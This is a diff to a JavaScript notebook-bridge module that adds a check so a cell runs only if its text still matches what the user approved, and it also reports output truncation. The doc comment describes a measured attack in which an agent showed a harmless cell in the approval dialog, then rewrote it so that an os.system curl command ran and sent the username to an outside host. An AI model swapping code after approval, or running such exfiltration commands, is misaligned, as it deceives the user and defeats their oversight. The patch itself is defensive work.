@@ -472,6 +472,30 @@ async function runCell(notebook, index) {
   }
 }
 
+/**
+ * Run a cell only if it still holds the exact text that was approved.
+ *
+ * An approval is for a specific piece of code, and nothing used to check that
+ * the code had not changed since. Measured: with bridge.execution 'ask', an
+ * agent pushed a cell, the modal showed `print("totally harmless")`, a second
+ * request rewrote that same cell while the dialog was open, the user clicked
+ * Run, and `os.system("curl -s https://.../$(whoami)")` executed. Three HTTP
+ * calls, one prompt, and the preview was never what ran.
+ *
+ * Also the one place that refuses index -1, which is what `writer.index` becomes
+ * once the cell is gone - executing range [-1, 0) is not a range anyone meant.
+ *
+ * Returns false when it declined, so the caller can say why.
+ */
+async function runApproved(notebook, index, approved) {
+  if (!Number.isInteger(index) || index < 0 || index >= notebook.cellCount) return false;
+  const cell = notebook.cellAt(index);
+  if (!cell) return false;
+  if (typeof approved === 'string' && cell.document.getText() !== approved) return false;
+  await runCell(notebook, index);
+  return true;
+}
+
 const OUTPUT_MIMES = [
   'application/vnd.code.notebook.stdout',
   'application/vnd.code.notebook.stderr',
@@ -507,16 +531,24 @@ function readOutputs(cell, { limit = 1200 } = {}) {
       }
     }
   }
-  const clip = (s) => (s.length > limit ? `${s.slice(0, limit)}\n...<truncated>` : s);
-  return {
-    error: errors.length ? clip(errors.join('\n\n')) : '',
-    text: text.length ? clip(text.join('')) : '',
+  // Reported rather than done silently: /cells used to derive its `truncated`
+  // flag from the source clip alone, so a response whose OUTPUTS were clipped
+  // said nothing had been - while carrying "...<truncated>" in the body.
+  let truncated = false;
+  const clip = (s) => {
+    if (s.length <= limit) return s;
+    truncated = true;
+    return `${s.slice(0, limit)}\n...<truncated>`;
   };
+  const error = errors.length ? clip(errors.join('\n\n')) : '';
+  const text_ = text.length ? clip(text.join('')) : '';
+  return { error, text: text_, truncated };
 }
 
 module.exports = {
   CellWriter,
   runCell,
+  runApproved,
   readOutputs,
   notebookLanguage,
   editorFor,
